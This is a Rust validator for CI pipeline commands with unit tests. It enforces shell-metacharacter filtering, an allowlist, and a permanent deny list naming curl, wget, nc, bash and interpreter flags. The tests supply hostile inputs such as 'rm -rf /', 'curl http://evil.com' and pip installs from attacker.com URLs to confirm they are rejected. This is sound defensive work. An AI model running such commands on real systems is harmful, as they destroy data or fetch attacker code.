use anyhow::{bail, Result};
use super::types::{Workflow, StepType};

const FORBIDDEN_SHELL_CHARS: &[char] = &[';', '&', '|', '`', '$', '(', ')', '{', '}', '<', '>', '\n', '\r', '\t', '*', '?', '[', ']'];

/// Hardcoded denylist of dangerous command prefixes that cannot be overridden
/// by per-repo custom allowlists.  Even if a `.dkod/pipeline.yaml` explicitly
/// allows one of these, the validator will reject it.
const ALWAYS_DENIED_PREFIXES: &[&str] = &[
    "curl ", "wget ", "nc ", "ncat ", "netcat ",
    "bash ", "sh ", "/bin/sh", "/bin/bash",
    "/usr/bin/curl", "/usr/bin/wget", "/usr/bin/nc", "/usr/bin/ncat",
    "/usr/bin/bash", "/usr/bin/sh", "/usr/bin/env bash", "/usr/bin/env sh",
    "/usr/bin/python", "/usr/bin/python3", "/usr/bin/perl", "/usr/bin/ruby",
    "/usr/bin/env python", "/usr/bin/env python3", "/usr/bin/env perl",
    "/usr/bin/env ruby", "/usr/bin/env node",
    "python -c", "python3 -c", "perl -e", "ruby -e",
    "eval ", "exec ",
    "go run",
    "cargo run", "cargo install",
    // Go execution-delegation flags that allow running arbitrary binaries
    "go test -exec ", "go build -toolexec ", "go vet -vettool ",
];

/// Substrings that are denied anywhere in a command, preventing flag-injection
/// attacks where execution-delegation flags appear mid-command (e.g.,
/// `go test -exec /bin/sh`).
const DENIED_FLAG_SUBSTRINGS: &[&str] = &[
    " -exec ", " -toolexec ", " -vettool ",
    " -exec=", " -toolexec=", " -vettool=",
    // Output path flags — prevent writing compiled artifacts to arbitrary paths
    // (e.g., `go build -o /tmp/payload ./cmd/exploit`)
    " -o ", " -o=", " -o/",  // catch concatenated form: go build -o/path " -o/",
    " --target-dir ", " --target-dir=",
    " --out-dir ", " --out-dir=",
    " --manifest-path ", " --manifest-path=",
    " --outDir ", " --outDir=", " --declarationDir ", " --declarationDir=",
    // TypeScript compiler output-path flags
    " --outDir ", " --outDir=", " --declarationDir ", " --declarationDir=",
    // Reject parent-dir traversal in install targets
    " ..",
    // URL schemes — prevent remote code fetching via pip install, npm, etc.
    " http://", " https://", " ftp://", " file://",
    " git+", " svn+", " hg+",
];

const ALLOWED_COMMAND_PREFIXES: &[&str] = &[
    "cargo check", "cargo test", "cargo clippy", "cargo fmt", "cargo build",
    "npm ci", "npm test", "npm run lint", "npm run check",
    "bun install --frozen-lockfile", "bun test", "bun run lint", "bun run check",
    "npx tsc", "bunx tsc",
    "pip install -e .", "pip install -r requirements.txt", "pytest", "python -m pytest",
    "go build", "go test", "go vet",
    "echo ", // Permitted for CI logging and test pipelines
    // NOTE: make targets removed from default allowlist because Makefile targets
    // can execute arbitrary shell commands, bypassing command security controls.
    // Use allowed_commands in pipeline.yaml to explicitly opt-in to make.
];

/// Check if a command matches an allowlist prefix with word-boundary awareness.
/// A prefix matches if the command equals the prefix exactly, or if the command
/// starts with the prefix followed by a space. This prevents "pytest" from
/// matching "pytest-exploit" while still allowing "pytest -v".
fn command_matches_prefix(command: &str, prefix: &str) -> bool {
    command == prefix
        || command.starts_with(&format!("{} ", prefix))
        || prefix.ends_with(' ') && command.starts_with(prefix)
}

pub fn validate_workflow(workflow: &Workflow) -> Result<()> {
    if workflow.stages.is_empty() {
        bail!("workflow '{}' has no stages", workflow.name);
    }
    for stage in &workflow.stages {
        if stage.steps.is_empty() {
            bail!("stage '{}' has no steps", stage.name);
        }
        for step in &stage.steps {
            if let StepType::Command { run } = &step.step_type {
                validate_command_with_allowlist(run, &workflow.allowed_commands)?;
            }
        }
    }
    Ok(())
}

pub fn validate_command(command: &str) -> Result<()> {
    validate_command_with_allowlist(command, &[])
}

pub fn validate_command_with_allowlist(command: &str, custom_allowlist: &[String]) -> Result<()> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        bail!("empty command");
    }
    if let Some(ch) = trimmed.chars().find(|c| FORBIDDEN_SHELL_CHARS.contains(c)) {
        bail!("command contains forbidden shell metacharacter: {:?}", ch);
    }
    // Always-denied prefixes override any allowlist (defense-in-depth)
    if ALWAYS_DENIED_PREFIXES.iter().any(|p| trimmed.starts_with(p)) {
        bail!(
            "command uses a permanently-denied prefix: '{}'",
            trimmed
        );
    }
    // Denied flag substrings prevent execution-delegation flag injection
    // (e.g., `go test -exec /bin/sh ./...`)
    if DENIED_FLAG_SUBSTRINGS.iter().any(|s| trimmed.contains(s)) {
        bail!(
            "command contains a denied execution-delegation flag: '{}'",
            trimmed
        );
    }
    if custom_allowlist.is_empty() {
        let is_allowed = ALLOWED_COMMAND_PREFIXES
            .iter()
            .any(|prefix| command_matches_prefix(trimmed, prefix));
        if !is_allowed {
            bail!(
                "command not in allowlist: '{}'. Allowed prefixes: {:?}",
                trimmed,
                ALLOWED_COMMAND_PREFIXES
            );
        }
    } else {
        let is_allowed = custom_allowlist
            .iter()
            .any(|prefix| command_matches_prefix(trimmed, prefix.as_str()));
        if !is_allowed {
            bail!(
                "command not in repo allowlist: '{}'. Allowed prefixes: {:?}",
                trimmed,
                custom_allowlist
            );
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::workflow::types::*;
    use std::time::Duration;

    fn make_cmd_step(name: &str, cmd: &str) -> Step {
        Step {
            name: name.to_string(),
            step_type: StepType::Command { run: cmd.to_string() },
            timeout: Duration::from_secs(60),
            required: true,
            changeset_aware: false,
        }
    }

    #[test]
    fn test_valid_commands() {
        assert!(validate_command("cargo check").is_ok());
        assert!(validate_command("cargo test --release").is_ok());
        assert!(validate_command("bun test").is_ok());
        assert!(validate_command("pytest -v").is_ok());
        assert!(validate_command("pytest").is_ok());
    }

    #[test]
    fn test_pytest_word_boundary() {
        // "pytest" should not match "pytest-exploit" (word boundary check)
        assert!(validate_command("pytest-exploit").is_err());
        assert!(validate_command("pytest_exploit").is_err());
        // But "pytest" and "pytest -v" should still work
        assert!(validate_command("pytest").is_ok());
        assert!(validate_command("pytest -v --tb=short").is_ok());
    }

    #[test]
    fn test_cargo_target_dir_denied() {
        assert!(validate_command("cargo build --target-dir /tmp/evil").is_err());
        assert!(validate_command("cargo build --target-dir=/tmp/evil").is_err());
        assert!(validate_command("cargo build --out-dir /tmp/evil").is_err());
    }

    #[test]
    fn test_go_build_concatenated_output_denied() {
        // go build -o/path (no space) should be blocked
        assert!(validate_command("go build -o/tmp/evil ./...").is_err());
    }

    #[test]
    fn test_tsc_output_dir_denied() {
        assert!(validate_command("npx tsc --outDir /tmp/evil").is_err());
        assert!(validate_command("npx tsc --outDir=/tmp/evil").is_err());
        assert!(validate_command("npx tsc --declarationDir /tmp/evil").is_err());
    }

    #[test]
    fn test_go_run_bare_denied() {
        // "go run" without trailing space should also be caught
        let custom = vec!["go run".to_string()];
        assert!(validate_command_with_allowlist("go run", &custom).is_err());
        assert!(validate_command_with_allowlist("go run ./cmd", &custom).is_err());
    }

    #[test]
    fn test_cargo_manifest_path_denied() {
        // --manifest-path allows compiling from outside the sandbox
        assert!(validate_command("cargo build --manifest-path /outside/Cargo.toml").is_err());
        assert!(validate_command("cargo test --manifest-path=/outside/Cargo.toml").is_err());
        assert!(validate_command("cargo check --manifest-path /etc/Cargo.toml").is_err());
    }

    #[test]
    fn test_rejected_commands() {
        assert!(validate_command("rm -rf /").is_err());
        assert!(validate_command("curl http://evil.com").is_err());
        assert!(validate_command("cargo test; rm -rf /").is_err());
        assert!(validate_command("cargo test && curl evil").is_err());
    }

    #[test]
    fn test_empty_stages_rejected() {
        let wf = Workflow {
            name: "bad".into(),
            timeout: Duration::from_secs(60),
            stages: vec![],
            allowed_commands: vec![],
        };
        assert!(validate_workflow(&wf).is_err());
    }

    #[test]
    fn test_valid_workflow_passes() {
        let wf = Workflow {
            name: "good".into(),
            timeout: Duration::from_secs(60),
            stages: vec![Stage {
                name: "checks".into(),
                parallel: false,
                steps: vec![make_cmd_step("test", "cargo test")],
            }],
            allowed_commands: vec![],
        };
        assert!(validate_workflow(&wf).is_ok());
    }

    #[test]
    fn test_bad_command_in_workflow_rejected() {
        let wf = Workflow {
            name: "bad".into(),
            timeout: Duration::from_secs(60),
            stages: vec![Stage {
                name: "checks".into(),
                parallel: false,
                steps: vec![make_cmd_step("evil", "rm -rf /")],
            }],
            allowed_commands: vec![],
        };
        assert!(validate_workflow(&wf).is_err());
    }

    #[test]
    fn test_glob_chars_rejected() {
        assert!(validate_command("cargo test src/*.rs").is_err());
        assert!(validate_command("cargo test src/?.rs").is_err());
        assert!(validate_command("cargo test src/[a-z].rs").is_err());
        assert!(validate_command("echo /etc/*").is_err());
        assert!(validate_command("echo ../../*").is_err());
    }

    #[test]
    fn test_custom_allowlist_permits_custom_command() {
        let custom = vec!["eslint".to_string(), "prettier --check".to_string()];
        assert!(validate_command_with_allowlist("eslint src/", &custom).is_ok());
        assert!(validate_command_with_allowlist("prettier --check .", &custom).is_ok());
    }

    #[test]
    fn test_custom_allowlist_rejects_unlisted_command() {
        let custom = vec!["eslint".to_string()];
        assert!(validate_command_with_allowlist("rm -rf /", &custom).is_err());
        assert!(validate_command_with_allowlist("cargo test", &custom).is_err());
    }

    #[test]
    fn test_custom_allowlist_still_blocks_shell_chars() {
        let custom = vec!["eslint".to_string()];
        assert!(validate_command_with_allowlist("eslint; rm -rf /", &custom).is_err());
    }

    #[test]
    fn test_empty_allowlist_uses_default() {
        assert!(validate_command_with_allowlist("cargo test", &[]).is_ok());
        assert!(validate_command_with_allowlist("rm -rf /", &[]).is_err());
    }

    #[test]
    fn test_validate_workflow_uses_custom_allowlist() {
        let wf = Workflow {
            name: "custom".into(),
            timeout: Duration::from_secs(60),
            stages: vec![Stage {
                name: "lint".into(),
                parallel: false,
                steps: vec![make_cmd_step("lint", "eslint src/")],
            }],
            allowed_commands: vec!["eslint".to_string()],
        };
        assert!(validate_workflow(&wf).is_ok());
    }

    #[test]
    fn test_validate_workflow_rejects_unlisted_with_custom_allowlist() {
        let wf = Workflow {
            name: "custom".into(),
            timeout: Duration::from_secs(60),
            stages: vec![Stage {
                name: "checks".into(),
                parallel: false,
                steps: vec![make_cmd_step("test", "cargo test")],
            }],
            allowed_commands: vec!["eslint".to_string()],
        };
        assert!(validate_workflow(&wf).is_err());
    }

    #[test]
    fn test_always_denied_prefixes_block_even_with_custom_allowlist() {
        let custom = vec!["curl ".to_string(), "wget ".to_string()];
        assert!(validate_command_with_allowlist("curl http://example.com", &custom).is_err());
        assert!(validate_command_with_allowlist("wget http://example.com", &custom).is_err());
        assert!(validate_command_with_allowlist("bash -c whoami", &custom).is_err());
        assert!(validate_command_with_allowlist("nc -l 1234", &custom).is_err());
        assert!(validate_command_with_allowlist("python -c 'import os'", &custom).is_err());
    }

    #[test]
    fn test_always_denied_prefixes_block_with_default_allowlist() {
        assert!(validate_command("curl http://example.com").is_err());
        assert!(validate_command("wget http://example.com").is_err());
        assert!(validate_command("bash -c whoami").is_err());
    }

    #[test]
    fn test_install_commands_allowed_by_default() {
        assert!(validate_command("npm ci").is_ok());
        assert!(validate_command("bun install --frozen-lockfile").is_ok());
        assert!(validate_command("pip install -r requirements.txt").is_ok());
        assert!(validate_command("pip install -e .").is_ok());
    }

    #[test]
    fn test_env_interpreter_variants_denied() {
        let custom = vec!["/usr/bin/env python3".to_string()];
        assert!(validate_command_with_allowlist("/usr/bin/env python3 script.py", &custom).is_err());
        assert!(validate_command_with_allowlist("/usr/bin/env python script.py", &custom).is_err());
        assert!(validate_command_with_allowlist("/usr/bin/env perl script.pl", &custom).is_err());
        assert!(validate_command_with_allowlist("/usr/bin/env ruby script.rb", &custom).is_err());
        assert!(validate_command_with_allowlist("/usr/bin/env node script.js", &custom).is_err());
    }

    #[test]
    fn test_go_commands_allowed_by_default() {
        assert!(validate_command("go build ./...").is_ok());
        assert!(validate_command("go test ./...").is_ok());
        assert!(validate_command("go vet ./...").is_ok());
    }

    #[test]
    fn test_go_run_denied() {
        // go run directly executes arbitrary Go programs
        assert!(validate_command("go run ./cmd/exploit").is_err());
        let custom = vec!["go run".to_string()];
        assert!(validate_command_with_allowlist("go run ./cmd/exploit", &custom).is_err());
    }

    #[test]
    fn test_pip_install_url_schemes_denied() {
        // pip install with remote URLs should be blocked by denied substrings
        assert!(validate_command("pip install -e git+https://attacker.com/evil.git").is_err());
        assert!(validate_command("pip install -r https://attacker.com/reqs.txt").is_err());
        assert!(validate_command("pip install -r http://attacker.com/reqs.txt").is_err());
        // Local paths should still be allowed
        assert!(validate_command("pip install -e .").is_ok());
        assert!(validate_command("pip install -r requirements.txt").is_ok());
    }

    #[test]
    fn test_cargo_run_and_install_denied() {
        assert!(validate_command("cargo run --bin exploit").is_err());
        let custom = vec!["cargo run".to_string()];
        assert!(validate_command_with_allowlist("cargo run ./cmd", &custom).is_err());
        assert!(validate_command("cargo install malicious-crate").is_err());
    }

    #[test]
    fn test_pip_install_parent_dir_denied() {
        // pip install -e .. would install from parent directory (sandbox escape)
        assert!(validate_command("pip install -e ..").is_err());
        assert!(validate_command("pip install -e ../other-pkg").is_err());
        // pip install -e . should still work
        assert!(validate_command("pip install -e .").is_ok());
    }

    #[test]
    fn test_go_build_output_flag_denied() {
        // go build -o allows writing binaries to arbitrary filesystem paths
        assert!(validate_command("go build -o /tmp/payload ./cmd/exploit").is_err());
        assert!(validate_command("go build -o=/tmp/payload ./...").is_err());
    }

    #[test]
    fn test_go_exec_delegation_flags_denied() {
        // go test -exec allows running arbitrary binaries
        assert!(validate_command("go test -exec /usr/bin/sh ./...").is_err());
        // go build -toolexec replaces the compiler toolchain
        assert!(validate_command("go build -toolexec ./evil ./...").is_err());
        // go vet -vettool replaces the vet analysis tool
        assert!(validate_command("go vet -vettool ./evil ./...").is_err());
    }
    #[test]
    fn test_go_build_concatenated_output_flag_denied() {
        // go build -o/tmp/evil bypasses " -o " and " -o=" but is caught by " -o/"
        assert!(validate_command("go build -o/tmp/evil ./...").is_err());
    }


    #[test]
    fn test_tsc_outdir_denied() {
        // npx tsc --outDir should be blocked to prevent file-write escape
        assert!(validate_command("npx tsc --outDir /tmp/evil").is_err());
        assert!(validate_command("npx tsc --outDir=/tmp/evil").is_err());
        assert!(validate_command("bunx tsc --declarationDir /tmp/evil").is_err());
        assert!(validate_command("bunx tsc --declarationDir=/tmp/evil").is_err());
    }

}

